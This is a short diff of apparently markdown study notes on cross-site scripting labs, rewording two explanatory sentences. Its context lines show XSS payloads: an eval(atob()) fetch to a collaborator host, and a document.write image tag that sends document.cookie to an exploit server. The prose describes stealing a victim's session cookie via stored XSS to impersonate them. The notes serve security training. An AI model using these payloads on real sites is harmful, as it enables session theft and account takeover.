@@ -609,7 +609,7 @@ https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c="
 <video src="https://EXPLOIT.net/video"></video>
 ```  
   
->Below log of requests to exploit log server showing which of the above tags worked.  
+>Below log of requests on exploit server show which of the above tags worked.  
 
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
@@ -633,7 +633,7 @@ document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'"
 </script>
 ```  
 
->Below target has a stored XSS vulnerability in the blog comments function. Ex-filtrate a victim user session cookie that views comments after they are posted, and then use their cookie to do impersonation.  
+>Below target has a stored XSS vulnerability in the blog comments function. Steal a victim user session cookie that views the comments after they are posted, and then use their cookie to do impersonation.  
 
 ![Stored XSS Blog post](images/stored-xss-blog-post.png)  
 
